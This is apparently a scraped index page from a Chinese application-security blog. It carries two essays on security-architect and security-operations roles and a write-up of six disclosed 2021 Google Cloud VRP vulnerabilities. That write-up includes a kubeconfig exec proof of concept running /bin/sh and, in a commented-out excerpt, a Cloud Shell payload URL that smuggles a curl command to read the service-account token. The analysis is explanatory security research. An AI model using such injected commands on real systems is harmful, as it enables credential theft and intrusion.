+问：“安全”“架构师”存在的意义是什么？：在上一篇文章中写了“技术安全运营”，那么在这之后的发展我浅薄的认为应该就是“安全架构师”了。
+参考架构师的Job Model，作为架构师，应该具备横向和纵向两方面的职责。
+一方面不能脱离实际的业务上下文，要深入到业务中，从业务战略到技术战略再到安全战略，到设计、实施、再到治理。提供一个简单、清晰、优秀的设计。在安全风险治理中什么是好的设计呢？默认安全和可持续化是最核心的两点。
+就像在实际的工作中，很多风险治理都是靠人力去运营，稍有成色便在PPT上侃侃而谈大书特书，但是实际上只要项目转为日常化运营，那便等于没人运营了。要想做到低成本的可持续风险治理何其难。
+再者是默认安全，在各类风险中，人的因素不可谓不大，一味的用各种方式要求“人”来保证安全，终归事倍功半。
+“安全架构师”在这其中，既要能设计出有效的阶段治理策略，又要保证这样的设计可以迭代可持续化。
+另一方面，“安全架构师”要融入到“系统架构师”圈子中，与他们就重要的概念达成一致。因为不存在哪个业务先设计好架构然后去发展的，大多都是野蛮生长然后再规范化。那在这个过程中，一个优秀的健壮的安全的架构需要“架构师”们一起对重要的概念、原则有广泛的共识，例如“默认安全”。
+“安全架构师”必须是一个长期主义者，要长期的去看一些东西。而要具备“长期主义”，是需要有信仰的，信仰何来，需要持续的对前沿的理念、技术进行学习，同时对身处其中的业务足够的了解，更重要的是要有一个可以培养“长期主义”的土壤（虽然现在的浮躁对于长期主义并不友好）。
+还有一个重要的点，不论是“架构”还是其它的比如“云安全”等，一定不要狭义的去理解，就比如“云安全”，不仅仅包括“K8S”，也包括“云系统网络的设计”、“云上应用的设计”、“云上数据安全保护”等等，“架构”也是同理，技术、产品、业务、经营等等都要交叉去思考，才能有一个更全局的视角和思考，“安全”真的是小的不能再小的一个赛道了，跨圈看看会发现有大量优秀的设计可以借鉴回来。
+看完这里，相信各位必然会有许多不同的见解，我也是正门外窥探，随便看看好了。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>资历尚浅，见识狭隘，仅以自身所见所闻所学，妄谈一下这个话题，当个乐子，随便看看。</p>
+</blockquote>
+</blockquote>
+<h3 id="问：“架构师”是岗位还是思想？"><a href="#问：“架构师”是岗位还是思想？" class="headerlink" title="问：“架构师”是岗位还是思想？"></a>问：“架构师”是岗位还是思想？</h3><p>：在阿里对架构师的定义是“去应对复杂性，应对熵值不断增加的一个组织性的力量。”“软件/系统架构的核心挑战是快速增长的复杂性，越是大型系统，越需要简单性。”识别和控制复杂度正式“架构师”在对复杂核心系统设计时候要考虑的重点。</p>
+<p>而架构的基本出发点是效率，通过合理的架构设计、有序化重构，实现效率最大化。</p>
+<p>架构师不应该脱离业务上下文而单独存在，好的架构师是为解决复杂问题而存在的，思考如何能用抽象的方法解决一类问题。将发现的问题进行抽象和归纳，定义问题的基本要素，定义出问题的短期和长期解决方案，推动技术整体的进步。</p>
+<p>简化一下架构师本质上是一种“发现问题—定义问题—解决问题”的能力或是思考模式，而如何定义问题是“架构师”是否优秀的核心衡量。</p>
+<h3 id="问：“架构师”需要具备哪些能力？"><a href="#问：“架构师”需要具备哪些能力？" class="headerlink" title="问：“架构师”需要具备哪些能力？"></a>问：“架构师”需要具备哪些能力？</h3><p>：“架构师”要具备的五个能力，1. 全局视角 2. 技术广度 3. 持续学习 4. 业务理解 5.结果落地。</p>
+<p>不同level的架构师的差别在于建设的范围，例如在阿里体系内，技术序列从P8开始就要具备架构师的能力，P8往往只负责一个单体业务，P9会负责一个更加复杂的单体业务，到了P10就要思考整个行业，而P11及以上就要跨行业、从集团整体角度去思考问题，最牛的架构师莫过于“1979年，那是一个春天，有一位老人，在中国的南海边，划了一个圈……”</p>
+<p>但是我更认可的是“架构师”是一个底层的人才特质，与层级无关。（实际上有大把P8并没有任何的“架构师”思维）</p>
+<h3 id="问：“架构师”需要非常精深的技术能力吗？"><a href="#问：“架构师”需要非常精深的技术能力吗？" class="headerlink" title="问：“架构师”需要非常精深的技术能力吗？"></a>问：“架构师”需要非常精深的技术能力吗？</h3><p>：如果身兼“架构师”的角色，往往就没有足够的时间去持续的精深技术，但是这个角色本身需要大量的实践和知识的积累，需要接触更多的人和事，用新的方法来解决新的问题。要具备这个能力，就要持续的保持先进技术学习的能力和经常性的实践。</p>
+<h3 id="问：“安全”“架构师”存在的意义是什么？"><a href="#问：“安全”“架构师”存在的意义是什么？" class="headerlink" title="问：“安全”“架构师”存在的意义是什么？"></a>问：“安全”“架构师”存在的意义是什么？</h3><p>：在上一篇文章中写了“技术安全运营”，那么在这之后的发展我浅薄的认为应该就是“安全架构师”了。</p>
+<p>参考架构师的Job Model，作为架构师，应该具备横向和纵向两方面的职责。</p>
+<p>一方面不能脱离实际的业务上下文，要深入到业务中，从业务战略到技术战略再到安全战略，到设计、实施、再到治理。提供一个简单、清晰、优秀的设计。在安全风险治理中什么是好的设计呢？默认安全和可持续化是最核心的两点。</p>
+<p>就像在实际的工作中，很多风险治理都是靠人力去运营，稍有成色便在PPT上侃侃而谈大书特书，但是实际上只要项目转为日常化运营，那便等于没人运营了。要想做到低成本的可持续风险治理何其难。</p>
+<p>再者是默认安全，在各类风险中，人的因素不可谓不大，一味的用各种方式要求“人”来保证安全，终归事倍功半。</p>
+<p>“安全架构师”在这其中，既要能设计出有效的阶段治理策略，又要保证这样的设计可以迭代可持续化。</p>
+<p>另一方面，“安全架构师”要融入到“系统架构师”圈子中，与他们就重要的概念达成一致。因为不存在哪个业务先设计好架构然后去发展的，大多都是野蛮生长然后再规范化。那在这个过程中，一个优秀的健壮的安全的架构需要“架构师”们一起对重要的概念、原则有广泛的共识，例如“默认安全”。</p>
+<p>“安全架构师”必须是一个长期主义者，要长期的去看一些东西。而要具备“长期主义”，是需要有信仰的，信仰何来，需要持续的对前沿的理念、技术进行学习，同时对身处其中的业务足够的了解，更重要的是要有一个可以培养“长期主义”的土壤（虽然现在的浮躁对于长期主义并不友好）。</p>
+<p>还有一个重要的点，不论是“架构”还是其它的比如“云安全”等，一定不要狭义的去理解，就比如“云安全”，不仅仅包括“K8S”，也包括“云系统网络的设计”、“云上应用的设计”、“云上数据安全保护”等等，“架构”也是同理，技术、产品、业务、经营等等都要交叉去思考，才能有一个更全局的视角和思考，“安全”真的是小的不能再小的一个赛道了，跨圈看看会发现有大量优秀的设计可以借鉴回来。</p>
+<p>看完这里，相信各位必然会有许多不同的见解，我也是正门外窥探，随便看看好了。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Jul 20 2022 21:00:00 GMT+0800">2022-07-20</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E5%A6%84%E8%B0%88%EF%BC%9A%E2%80%9C%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E2%80%9D%E7%9A%84%E6%9C%AA%E6%9D%A5%E6%98%AF%E2%80%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E5%B8%88%E2%80%9D/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E7%AE%80%E5%8D%95%E8%81%8A%E8%81%8A%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">
+                        简单聊聊应用安全领域中的技术安全运营
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        技术安全运营是一个上限极高同时又下限极低的一个角色，做好不易。
+注解：本文中“技术安全运营”的定义
+安全团队中的工种基本可以分为两类，“运营岗”和“技术岗”，而“技术岗”有可以分为开发安全产品的“研发岗/算法岗”和使用这些安全产品的“(技术)运营岗“。因此，例如各类安全产品的运营人员、SDLC安全人员等均可称为”技术安全运营“。
+本文中以几个实际场景中的例子来讨论不同能力的技术安全运营人员之间的差别。因视野有限，以下仅当胡言乱语，勿对号入座。
+场景一：漏洞运营SRC或黑白灰扫描器等发现漏洞后：
+“初级的”技术安全运营简单验证/不验证后点击确认漏洞下发到研发进行修复，同时针对研发的修复疑问进行答疑(一般在此处多是针对漏洞本身进行修复，而不是考虑是否是最优解)，在修复完成后验证/不验证后关闭工单，某漏洞的运营到这里就结束了。
+“中级的”技术安全运营简单验证漏洞后给到研发进行修复，同时主动找到开发确定产生漏洞的根本原因，是系统架构层面原因还是安全意识原因，修复方案是否可以实现“默认安全”，该系统中是否还存在类似问题，在漏洞止血/修复后，进行漏洞复盘，寻找根因，优化研发流程/SDLC流程来避免该风险。
+“高级的”技术安全运营在“中级”之上，不定期归结历史漏洞产生原因，抽象当前应用层面临的核心风险TOP，然后针对不同的TOP风险，统筹资源，进行全域治理，优先从架构层、框架层进行风险解决，而不是将所有疑似风险下发让研发自查(如果所有的问题都用这种方式解决，那未必也太无能了)，避免沦为成为“工单下发工程师”、“首席客服官”。
+场景二：RASP/WAF等等安全产品运营(非安全产品角色，而是产品使用方)安全产品的使用可以简单分为“部署”、“响应”两部分
+“初级的”技术安全运营“部署”
+从安全产品研发侧拿到部署文档和模棱两可的稳定性影响，然后进行通过邮件/群组通知到研发，进行部署，当研发产生疑问/部署失败时，拉相关安全产品研发进行答疑，而自己全程都是一个“proxy”。
+“响应”
+当事件发生告警时，拉群应急，完成止血，影响不大则应急结束，影响较大往往被动复盘，效果不佳。
+“中级的”技术安全运营“部署”
+在部署前，建立标准的部署流程，验证稳定性和防护效果，与安全产品团队制定稳定性标准和规则下发标准，同时建立完善的稳定性问题解决SOP和部署答疑指南。
+在部署时，与架构师团队协作，分优先级、分批次进行灰度部署，以稳定性为核心。
+在部署后，监测覆盖率变化，进行动态全覆盖。
+“响应”
+事件发生告警时，止血遏制，然后进行详细复盘，确定正式修复方案和排期、安全产品告警是否准确和及时、全域同类风险解决方案等。
+同时安全产品不可避免的会产生大量误报，通过对告警风险进行风险(更进一步进行自动化告警优化)，同时与安全产品团队进行规则优化，降低误报率。
+“高级的”技术安全运营让自己成为安全产品的半个PD，将自己安全经验融入到产品的设计中去，帮助安全产品进行架构优化。（这部分笔者并无多少经验，是未来要进行深入的方向之一）
+透过这两个简单例子，便是我对“技术安全运营”这个角色的简单理解。做与做好之间的差距是巨大的，核心是是否对自己的能力有成长。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p><strong>技术安全运营是一个上限极高同时又下限极低的一个角色，做好不易。</strong></p>
+<p>注解：本文中“技术安全运营”的定义</p>
+<p>安全团队中的工种基本可以分为两类，“运营岗”和“技术岗”，而“技术岗”有可以分为开发安全产品的“研发岗/算法岗”和使用这些安全产品的“(技术)运营岗“。因此，例如各类安全产品的运营人员、SDLC安全人员等均可称为”技术安全运营“。</p>
+<p>本文中以几个实际场景中的例子来讨论不同能力的技术安全运营人员之间的差别。因视野有限，以下仅当胡言乱语，勿对号入座。</p>
+<h2 id="场景一：漏洞运营"><a href="#场景一：漏洞运营" class="headerlink" title="场景一：漏洞运营"></a>场景一：漏洞运营</h2><p>SRC或黑白灰扫描器等发现漏洞后：</p>
+<h3 id="“初级的”技术安全运营"><a href="#“初级的”技术安全运营" class="headerlink" title="“初级的”技术安全运营"></a>“初级的”技术安全运营</h3><p>简单验证/不验证后点击确认漏洞下发到研发进行修复，同时针对研发的修复疑问进行答疑(一般在此处多是针对漏洞本身进行修复，而不是考虑是否是最优解)，在修复完成后验证/不验证后关闭工单，某漏洞的运营到这里就结束了。</p>
+<h3 id="“中级的”技术安全运营"><a href="#“中级的”技术安全运营" class="headerlink" title="“中级的”技术安全运营"></a>“中级的”技术安全运营</h3><p>简单验证漏洞后给到研发进行修复，同时主动找到开发确定产生漏洞的根本原因，是系统架构层面原因还是安全意识原因，修复方案是否可以实现“默认安全”，该系统中是否还存在类似问题，在漏洞止血/修复后，进行漏洞复盘，寻找根因，优化研发流程/SDLC流程来避免该风险。</p>
+<h3 id="“高级的”技术安全运营"><a href="#“高级的”技术安全运营" class="headerlink" title="“高级的”技术安全运营"></a>“高级的”技术安全运营</h3><p>在“中级”之上，不定期归结历史漏洞产生原因，抽象当前应用层面临的核心风险TOP，然后针对不同的TOP风险，统筹资源，进行全域治理，优先从架构层、框架层进行风险解决，而不是将所有疑似风险下发让研发自查(如果所有的问题都用这种方式解决，那未必也太无能了)，避免沦为成为“工单下发工程师”、“首席客服官”。</p>
+<h2 id="场景二：RASP-WAF等等安全产品运营-非安全产品角色，而是产品使用方"><a href="#场景二：RASP-WAF等等安全产品运营-非安全产品角色，而是产品使用方" class="headerlink" title="场景二：RASP/WAF等等安全产品运营(非安全产品角色，而是产品使用方)"></a>场景二：RASP/WAF等等安全产品运营(非安全产品角色，而是产品使用方)</h2><p>安全产品的使用可以简单分为“部署”、“响应”两部分</p>
+<h3 id="“初级的”技术安全运营-1"><a href="#“初级的”技术安全运营-1" class="headerlink" title="“初级的”技术安全运营"></a>“初级的”技术安全运营</h3><p>“部署”</p>
+<p>从安全产品研发侧拿到部署文档和模棱两可的稳定性影响，然后进行通过邮件/群组通知到研发，进行部署，当研发产生疑问/部署失败时，拉相关安全产品研发进行答疑，而自己全程都是一个“proxy”。</p>
+<p>“响应”</p>
+<p>当事件发生告警时，拉群应急，完成止血，影响不大则应急结束，影响较大往往被动复盘，效果不佳。</p>
+<h3 id="“中级的”技术安全运营-1"><a href="#“中级的”技术安全运营-1" class="headerlink" title="“中级的”技术安全运营"></a>“中级的”技术安全运营</h3><p>“部署”</p>
+<p>在部署前，建立标准的部署流程，验证稳定性和防护效果，与安全产品团队制定稳定性标准和规则下发标准，同时建立完善的稳定性问题解决SOP和部署答疑指南。</p>
+<p>在部署时，与架构师团队协作，分优先级、分批次进行灰度部署，以稳定性为核心。</p>
+<p>在部署后，监测覆盖率变化，进行动态全覆盖。</p>
+<p>“响应”</p>
+<p>事件发生告警时，止血遏制，然后进行详细复盘，确定正式修复方案和排期、安全产品告警是否准确和及时、全域同类风险解决方案等。</p>
+<p>同时安全产品不可避免的会产生大量误报，通过对告警风险进行风险(更进一步进行自动化告警优化)，同时与安全产品团队进行规则优化，降低误报率。</p>
+<h3 id="“高级的”技术安全运营-1"><a href="#“高级的”技术安全运营-1" class="headerlink" title="“高级的”技术安全运营"></a>“高级的”技术安全运营</h3><p>让自己成为安全产品的半个PD，将自己安全经验融入到产品的设计中去，帮助安全产品进行架构优化。（这部分笔者并无多少经验，是未来要进行深入的方向之一）</p>
+<p>透过这两个简单例子，便是我对“技术安全运营”这个角色的简单理解。做与做好之间的差距是巨大的，核心是是否对自己的能力有成长。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Jul 15 2022 21:00:00 GMT+0800">2022-07-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E7%AE%80%E5%8D%95%E8%81%8A%E8%81%8A%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Cloud%20I%20Hack%20into%20Google%20Cloud/">
+                        Cloud I Hack into Google Cloud
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        在本月初，Google宣布了去年2021的Google Cloud Platform的六个VRP漏洞（ GCP VRP 奖旨在鼓励安全研究人员关注 GCP 的安全性，从而帮助我们为我们的用户、客户和整个互联网提高 GCP 的安全性），希望鼓励更多的安全研究者涉足云安全领域，这六个漏洞看完非常有趣，接下来我会用自己的理解分析下这几个漏洞。
+漏洞1: Bypassing Identity-Aware Proxy漏洞详情链接：https://www.seblu.de/2021/12/iap-bypass.html
+IAP(Identity-Aware Proxy)可以理解为是应用层零信任，在用户和应用之间增加了一层独立的身份认证。https://cloud.google.com/iap?hl=zh-cn
+
+根据作者的漏洞介绍，尝试着画了一下攻击路径(原文描述的有点凌乱，可能有不对的地方，见谅)，大概路径是通过这三个小漏洞，利用重定向，在受害者访问开启了IAP的APP之前先重定向到没有开IAP的APP上，然后捕获链接中的token，实现凭证窃取。
+
+就像作者说的，小的漏洞可以组合成大的漏洞，这或许也是Google为什么将其排在第一位的原因吧。
+漏洞2: 通过DHCP泛洪接管VM和获取ROOT访问权限漏洞详情链接：https://github.com/irsl/gcp-dhcp-takeover-code-exec
+ISC 的 DHCP 客户端（Debian 风格的 isc-dhcp-client 包）的实现依赖于 random(3) 来生成伪随机数（非线性加性反馈随机数）。由当前unixtime、dhclient进程的pid和MAC最后四个字节。这三个值可以猜测出来，进而可以伪造DHCP包，在某些环境下，通过DHCP泛洪可以接管目标VM的网络配置。
+允许攻击者通过向虚拟机发送恶意 DHCP 数据包并冒充 GCE 元数据服务器来访问 Google Compute Engine 虚拟机。
+1Google 严重依赖元数据服务器，包括 ssh 公钥的分发。 连接在网络/路由层是安全的，并且服务器没有经过身份验证（没有 TLS，仅清除 http）。 负责处理元数据服务器响应的google_guest_agent 进程通过虚拟主机名 metadata.google.internal 建立连接，该虚拟主机名是 /etc/hosts 文件中的别名。 该文件由 /etc/dhcp/dhclient-exit-hooks.d/google_set_hostname 作为 DHCP 响应处理的钩子部分管理，并且别名通常由该脚本在每个 DHCPACK 处添加。 通过完全控制 DHCP，可以模拟元数据服务器。
+
+
+漏洞4: 在 Cloud SQL 的中发现的多个漏洞漏洞详情链接：https://irsl.medium.com/the-speckle-umbrella-story-part-2-fcc0193614ea
+ 作者研究Cloud SQL 攻击向量的过程中发现的多个漏洞
+3.1 Postgres 服务帐户可以访问其他 RDS（MySQL、SQL Server 等）的 Docker 映像
+3.2 MySQL LOAD DATA LOCAL 滥用
+3.3 终端转义序列注入 gcloud
+3.4 Postgres IAM 身份验证可能允许窃取其他用户的访问令牌
+3.5 Cloud SQL Auth Proxy 通过网络泄露访问令牌 — 中间人攻击
+3.6 Cloud SQL — SQL 代理信息泄露漏洞（项目和实例名称）
+这一系列漏洞对于研究其它云产品的安全性有着很大的借鉴意义。“在服务器端环顾四周是一次很棒的经历，我学到了很多关于 Google 内部的知识！”
+漏洞3: Google Cloud Dataflow 中的RCE漏洞详情链接：https://mbrancato.github.io/2021/12/28/rce-dataflow.html
+Dataflow 节点暴露了未经身份验证的 Java JMX 端口，但是GCP默认的防火墙规则不会使其暴露在互联网。不过很多GCP用户会调整防火墙规则，导致5555端口暴露在互联网，从而可以被远程获取shell。
+这也是个蛮有趣的漏洞，用户的一些配置使安全变成了不安全，这在日常的工作中也经常遇到，任何一方做好都没有漏洞，挺好奇Google是如何修复的？
+漏洞5: Managed Anthos Service Mesh 控制面中的RCE漏洞详情链接：https://lf.lc/vrp/203177829/
+控制面（control plane）：用于帮助service mesh 来进行服务发现、流量治理等。
+
+这个漏洞在一般情况下需要在K8s集群中具有高访问权限，才能允许Istio控制面上执行远程命令。但是在某些特殊的场景下，就像Managed Anthos Service Mesh中，它在Google管理的项目中运行Istio控制面，当具备了高访问权限的时候，这个漏洞就变得严重了。（不知道这样理解对不对）
+12345678910111213141516171819apiVersion: v1kind: Configcurrent-context: defaultclusters:- name: default  cluster:    server: https://127.0.0.1contexts:- name: default  context:    cluster: default    user: defaultusers:- name: default  user:    exec:      apiVersion: client.authentication.k8s.io/v1beta1      command: /bin/sh      args: [&#x27;-c&#x27;, &#x27;touch /tmp/flag&#x27;]
+
+漏洞6: Google Cloud Shell 中的命令注入漏洞详情链接：https://docs.google.com/document/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs/edit#
+Cloud Shell 有个功能是可以通过类似下面的链接clone可信代码库的代码
+12https://ssh.cloud.google.com/?git_repo=https://github.com/GoogleCloudPlatform/gsutilhttps://ssh.cloud.google.com/?go_get_repo=github.com/google/gops
+但是在配置文件中有个缺陷，git_repo和go_get_repo两个参数同时存在于链接中时，判断逻辑是or，所以只要git_repo和go_get_repo其中一个存在其中就可以，所以可以在go_get_repo参数上添加命令，同时在git_repo上加载可信代码库。
+
+最终构造的payload为：
+1https://shell.cloud.google.com/?show=ide&amp;go_get_repo=%22;curl%200/service-accounts/default/token;%23&amp;git_repo=github.com/GoogleCloudPlatform/gsutil
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>在本月初，Google宣布了去年2021的Google Cloud Platform的六个VRP漏洞（ GCP VRP 奖旨在鼓励安全研究人员关注 GCP 的安全性，从而帮助我们为我们的用户、客户和整个互联网提高 GCP 的安全性），希望鼓励更多的安全研究者涉足云安全领域，这六个漏洞看完非常有趣，接下来我会用自己的理解分析下这几个漏洞。</p>
+<h2 id="漏洞1-Bypassing-Identity-Aware-Proxy"><a href="#漏洞1-Bypassing-Identity-Aware-Proxy" class="headerlink" title="漏洞1: Bypassing Identity-Aware Proxy"></a>漏洞1: Bypassing Identity-Aware Proxy</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://www.seblu.de/2021/12/iap-bypass.html">https://www.seblu.de/2021/12/iap-bypass.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>IAP(Identity-Aware Proxy)可以理解为是应用层零信任，在用户和应用之间增加了一层独立的身份认证。<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/iap?hl=zh-cn">https://cloud.google.com/iap?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>根据作者的漏洞介绍，尝试着画了一下攻击路径(原文描述的有点凌乱，可能有不对的地方，见谅)，大概路径是通过这三个小漏洞，利用重定向，在受害者访问开启了IAP的APP之前先重定向到没有开IAP的APP上，然后捕获链接中的token，实现凭证窃取。</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>就像作者说的，小的漏洞可以组合成大的漏洞，这或许也是Google为什么将其排在第一位的原因吧。</p>
+<h2 id="漏洞2-通过DHCP泛洪接管VM和获取ROOT访问权限"><a href="#漏洞2-通过DHCP泛洪接管VM和获取ROOT访问权限" class="headerlink" title="漏洞2: 通过DHCP泛洪接管VM和获取ROOT访问权限"></a>漏洞2: 通过DHCP泛洪接管VM和获取ROOT访问权限</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">https://github.com/irsl/gcp-dhcp-takeover-code-exec<i class="fas fa-external-link-alt"></i></a></p>
+<p>ISC 的 DHCP 客户端（Debian 风格的 isc-dhcp-client 包）的实现依赖于 random(3) 来生成伪随机数（非线性加性反馈随机数）。由当前unixtime、dhclient进程的pid和MAC最后四个字节。这三个值可以猜测出来，进而可以伪造DHCP包，在某些环境下，通过DHCP泛洪可以接管目标VM的网络配置。</p>
+<p>允许攻击者通过向虚拟机发送恶意 DHCP 数据包并冒充 GCE 元数据服务器来访问 Google Compute Engine 虚拟机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Google 严重依赖元数据服务器，包括 ssh 公钥的分发。 连接在网络/路由层是安全的，并且服务器没有经过身份验证（没有 TLS，仅清除 http）。 负责处理元数据服务器响应的google_guest_agent 进程通过虚拟主机名 metadata.google.internal 建立连接，该虚拟主机名是 /etc/hosts 文件中的别名。 该文件由 /etc/dhcp/dhclient-exit-hooks.d/google_set_hostname 作为 DHCP 响应处理的钩子部分管理，并且别名通常由该脚本在每个 DHCPACK 处添加。 通过完全控制 DHCP，可以模拟元数据服务器。</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="漏洞4-在-Cloud-SQL-的中发现的多个漏洞"><a href="#漏洞4-在-Cloud-SQL-的中发现的多个漏洞" class="headerlink" title="漏洞4: 在 Cloud SQL 的中发现的多个漏洞"></a>漏洞4: 在 Cloud SQL 的中发现的多个漏洞</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://irsl.medium.com/the-speckle-umbrella-story-part-2-fcc0193614ea">https://irsl.medium.com/the-speckle-umbrella-story-part-2-fcc0193614ea<i class="fas fa-external-link-alt"></i></a></p>
+<p> 作者研究Cloud SQL 攻击向量的过程中发现的多个漏洞</p>
+<p>3.1 Postgres 服务帐户可以访问其他 RDS（MySQL、SQL Server 等）的 Docker 映像</p>
+<p>3.2 MySQL LOAD DATA LOCAL 滥用</p>
+<p>3.3 终端转义序列注入 gcloud</p>
+<p>3.4 Postgres IAM 身份验证可能允许窃取其他用户的访问令牌</p>
+<p>3.5 Cloud SQL Auth Proxy 通过网络泄露访问令牌 — 中间人攻击</p>
+<p>3.6 Cloud SQL — SQL 代理信息泄露漏洞（项目和实例名称）</p>
+<p>这一系列漏洞对于研究其它云产品的安全性有着很大的借鉴意义。“在服务器端环顾四周是一次很棒的经历，我学到了很多关于 Google 内部的知识！”</p>
+<h2 id="漏洞3-Google-Cloud-Dataflow-中的RCE"><a href="#漏洞3-Google-Cloud-Dataflow-中的RCE" class="headerlink" title="漏洞3: Google Cloud Dataflow 中的RCE"></a>漏洞3: Google Cloud Dataflow 中的RCE</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://mbrancato.github.io/2021/12/28/rce-dataflow.html">https://mbrancato.github.io/2021/12/28/rce-dataflow.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>Dataflow 节点暴露了未经身份验证的 Java JMX 端口，但是GCP默认的防火墙规则不会使其暴露在互联网。不过很多GCP用户会调整防火墙规则，导致5555端口暴露在互联网，从而可以被远程获取shell。</p>
+<p>这也是个蛮有趣的漏洞，用户的一些配置使安全变成了不安全，这在日常的工作中也经常遇到，任何一方做好都没有漏洞，挺好奇Google是如何修复的？</p>
+<h2 id="漏洞5-Managed-Anthos-Service-Mesh-控制面中的RCE"><a href="#漏洞5-Managed-Anthos-Service-Mesh-控制面中的RCE" class="headerlink" title="漏洞5: Managed Anthos Service Mesh 控制面中的RCE"></a>漏洞5: Managed Anthos Service Mesh 控制面中的RCE</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://lf.lc/vrp/203177829/">https://lf.lc/vrp/203177829/<i class="fas fa-external-link-alt"></i></a></p>
+<p>控制面（control plane）：用于帮助service mesh 来进行服务发现、流量治理等。</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>这个漏洞在一般情况下需要在K8s集群中具有高访问权限，才能允许Istio控制面上执行远程命令。但是在某些特殊的场景下，就像Managed Anthos Service Mesh中，它在Google管理的项目中运行Istio控制面，当具备了高访问权限的时候，这个漏洞就变得严重了。（不知道这样理解对不对）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Config</span><br><span class="line">current-context: default</span><br><span class="line">clusters:</span><br><span class="line">- name: default</span><br><span class="line">  cluster:</span><br><span class="line">    server: https://127.0.0.1</span><br><span class="line">contexts:</span><br><span class="line">- name: default</span><br><span class="line">  context:</span><br><span class="line">    cluster: default</span><br><span class="line">    user: default</span><br><span class="line">users:</span><br><span class="line">- name: default</span><br><span class="line">  user:</span><br><span class="line">    exec:</span><br><span class="line">      apiVersion: client.authentication.k8s.io/v1beta1</span><br><span class="line">      command: /bin/sh</span><br><span class="line">      args: [&#x27;-c&#x27;, &#x27;touch /tmp/flag&#x27;]</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞6-Google-Cloud-Shell-中的命令注入"><a href="#漏洞6-Google-Cloud-Shell-中的命令注入" class="headerlink" title="漏洞6: Google Cloud Shell 中的命令注入"></a>漏洞6: Google Cloud Shell 中的命令注入</h2><p>漏洞详情链接：<a class="link" target="_blank" rel="noopener" href="https://docs.google.com/document/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs/edit#">https://docs.google.com/document/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs/edit#<i class="fas fa-external-link-alt"></i></a></p>
